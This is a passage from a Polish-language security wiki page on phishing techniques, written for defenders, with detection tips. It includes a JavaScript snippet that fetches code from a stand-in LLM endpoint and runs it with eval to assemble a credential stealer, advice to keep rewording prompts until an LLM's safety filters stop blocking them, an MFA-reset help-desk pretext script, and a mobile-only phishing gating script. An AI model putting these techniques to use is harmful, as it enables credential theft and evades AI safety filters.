  * Zachowuje to elastyczność C2 (serwer może zmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Szukaj procesów potomnych PowerShell uruchomionych przez `rundll32.exe` z jednoczesnym użyciem `-WindowStyle Hidden`, `FromBase64String` i `Invoke-Expression`.
* Obrońcy mogą szukać żądań HTTP(S) w formie `...page.php?tynor=<COMPUTER>sss<USER>` oraz 5-minutowych interwałów odpytywania po załadowaniu DLL.

---

## Malvertising wyzwalany wyświetleniem reklamy za pośrednictwem RTB

W przeciwieństwie do sponsorowanego wyniku wyszukiwania, który wymaga kliknięcia, reklama RTB może załadować JavaScript strony trzeciej podczas renderowania kreacji w witrynie lub aplikacji. Citizen Lab zaobserwowało tagi reklamowe wywołujące oddzielny serwer decyzyjny z identyfikatorami reklamowymi. Większość wyświetleń otrzymywała pustą odpowiedź; wybrane mogły otrzymać JavaScript. Nieszkodliwa odpowiedź podczas ponownego odtworzenia nie dowodzi więc, że każdy odbiorca otrzymał tę samą treść.<sup>[[14]](#references)</sup>

Jest to **mechanizm dostarczania**, a nie samodzielny exploit: wykonanie JavaScriptu w kontekście renderowania reklamy nie powoduje automatycznej instalacji spyware. Nie ujawniono bazowego exploita przeglądarki ani systemu operacyjnego, dlatego samo wyświetlenie reklamy lub żądanie do serwera decyzyjnego nie jest dowodem infekcji. Informacje o powiązywaniu identyfikatorów na potrzeby targetowania RTB znajdziesz w sekcji [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Operacje phishingowe wspomagane przez AI
Atakujący łączą teraz **API LLM i klonowania głosu**, aby tworzyć w pełni spersonalizowane przynęty i prowadzić interakcję w czasie rzeczywistym.

| Warstwa | Przykładowe zastosowanie przez sprawcę zagrożenia |
|-------|-----------------------------|
|Automatyzacja|Generowanie i wysyłanie ponad 100 tys. e-maili / SMS-ów z losowo zmienianym brzmieniem i linkami śledzącymi.|
|Generatywna AI|Tworzenie *jednorazowych* e-maili nawiązujących do publicznych fuzji i przejęć oraz żartów z mediów społecznościowych; deepfake głosu CEO w oszustwie z oddzwonieniem.|
|Agentowa AI|Autonomiczna rejestracja domen, zbieranie informacji z otwartych źródeł i przygotowywanie kolejnych wiadomości, gdy ofiara kliknie, ale nie poda danych logowania.|

**Obrona:**  
• Dodaj **dynamiczne banery** wyróżniające wiadomości wysłane przez niezaufaną automatyzację (na podstawie anomalii ARC/DKIM).  
• W przypadku rozmów telefonicznych o wysokim ryzyku stosuj **frazy weryfikacyjne dla biometrii głosu**.  
• Stale symuluj przynęty generowane przez AI w programach podnoszenia świadomości — statyczne szablony są przestarzałe.

Zobacz także — nadużywanie agentowego przeglądania do phishingu wyłudzającego dane logowania:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także — nadużywanie przez agentów AI lokalnych narzędzi CLI i MCP (do inwentaryzacji sekretów i wykrywania):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Wspomagane przez LLM składanie JavaScriptu phishingowego w runtime (generowanie kodu w przeglądarce)

Atakujący mogą dostarczyć pozornie nieszkodliwy kod HTML i **wygenerować stealera w runtime**, prosząc o JavaScript **zaufane API LLM**, a następnie wykonując go w przeglądarce (np. za pomocą `eval` lub dynamicznego `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt jako zaciemnianie:** zakoduj adresy URL eksfiltracji i ciągi Base64 w prompcie; iteracyjnie zmieniaj jego treść, aby omijać filtry bezpieczeństwa i ograniczać halucynacje.
2. **Wywołanie API po stronie klienta:** po załadowaniu JS wywołuje publiczny LLM (Gemini/DeepSeek itp.) lub proxy CDN; w statycznym kodzie HTML znajduje się tylko prompt/wywołanie API.
3. **Złożenie i wykonanie:** połącz odpowiedź i wykonaj ją (polimorficznie przy każdej wizycie):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokenów LogoKit) i wysyła dane logowania do ukrytego w promptcie endpointu.

**Cechy utrudniające wykrycie**
- Ruch trafia do dobrze znanych domen LLM lub zaufanych proxy CDN, czasem przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS istnieje dopiero po renderowaniu.
- Niedeterministyczne generowanie tworzy **unikalne** stealery dla każdej sesji.

**Pomysły na wykrywanie**
- Uruchamiaj sandboxy z włączonym JS; oznaczaj użycie **`eval` w czasie działania / dynamiczne tworzenie skryptów na podstawie odpowiedzi LLM**.
- Wyszukuj żądania POST z frontendu do API LLM, po których natychmiast następuje użycie `eval`/`Function` na zwróconym tekście.
- Generuj alerty dotyczące niezatwierdzonych domen LLM w ruchu klienta, po których następują żądania POST z danymi logowania.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oprócz klasycznego push-bombingu operatorzy po prostu **wymuszają ponowną rejestrację MFA** podczas rozmowy z help deskiem, unieważniając dotychczasowy token użytkownika. Każdy kolejny monit logowania wygląda dla ofiary na uzasadniony.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w odstępie kilku minut i z tego samego IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu skopiować złośliwe polecenia do schowka ofiary ze zhakowanej lub podszywającej się strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez pobierania plików ani załączników.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobilny i dystrybucja złośliwych aplikacji (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Przejęcie łączenia urządzenia WhatsApp za pomocą socjotechniki opartej na kodzie QR
* Strona-przynęta (np. fałszywy „kanał” ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, po cichu dodając atakującego jako **połączone urządzenie**.<sup>[[12]](#references)</sup>
* Atakujący natychmiast uzyskuje wgląd w czaty i kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie „połączono nowe urządzenie”; obrońcy mogą wyszukiwać nieoczekiwane zdarzenia łączenia urządzeń krótko po wizytach na niezaufanych stronach z kodami QR.

### Phishing ograniczony do urządzeń mobilnych w celu ominięcia crawlerów/sandboxów
Operatorzy coraz częściej ograniczają dostęp do swoich stron phishingowych za pomocą prostego sprawdzenia urządzenia, tak aby crawlery desktopowe nigdy nie docierały do stron docelowych. Częstym rozwiązaniem jest krótki skrypt, który sprawdza, czy DOM obsługuje dotyk, i wysyła wynik do endpointu serwera; klientom innym niż mobilne zwracany jest HTTP 500 (lub pusta strona), a użytkownikom urządzeń mobilnych wyświetlany jest pełny proces.<sup>[[7]](#references)</sup>

Minimalny fragment kodu klienta (typowa logika):

```html
<script src="/static/detect_device.js"></script>
```

Logika `detect_device.js` (w uproszczeniu):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Często obserwowane zachowanie serwera:
- Ustawia cookie sesji podczas pierwszego wczytania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) przy kolejnych żądaniach GET, gdy `is_mobile=false`; udostępnia phishing tylko wtedy, gdy `true`.

Wskazówki dotyczące wyszukiwania i wykrywania:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria sieciowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń innych niż mobile; prawidłowe ścieżki ofiar korzystających z urządzeń mobile zwracają 200, a następnie HTML/JS.
- Blokuj lub dokładniej analizuj strony, które warunkują wyświetlanie treści wyłącznie na podstawie `ontouchstart` lub podobnych kontroli urządzenia.

Wskazówki dotyczące obrony:
- Uruchamiaj crawlery z fingerprintami przypominającymi urządzenia mobile i włączoną obsługą JS, aby ujawniać ukrytą treść.
- Generuj alerty dotyczące podejrzanych odpowiedzi 500 po `POST /detect` w domenach zarejestrowanych niedawno.

## References

- [1] [Generowanie wariantów domen wykorzystywanych w phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Wykrywanie phishingu: narzędzia i techniki (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kradzież danych uwierzytelniających i omijanie 2FA za pomocą noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jak zainstalować i skonfigurować DKIM z Postfix na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalny raport Unit 42 dotyczący reagowania na incydenty z 2025 r. – edycja poświęcona inżynierii społecznej](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Cichy smishing – infrastruktura phishingowa dostępna wyłącznie z urządzeń mobile i heurystyki (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Następna granica ataków opartych na składaniu kodu w czasie działania: wykorzystanie LLM do generowania JavaScriptu phishingowego w czasie rzeczywistym](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Podszywanie się, przechwytywanie kliknięć i TDS: wnętrze ekosystemu dystrybucji malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Przechwytywanie ruchu do windows.com firmy Microsoft za pomocą bit flippingu (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Miłość? A może jednak: fałszywa aplikacja randkowa jako przynęta w ukierunkowanej kampanii spyware w Pakistanie](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC i próbki ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Ujawnienie AdFection: jak Discover-Tech przekształcił ukierunkowane reklamy w kanał dystrybucji spyware mercenary niewymagającego kliknięcia](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
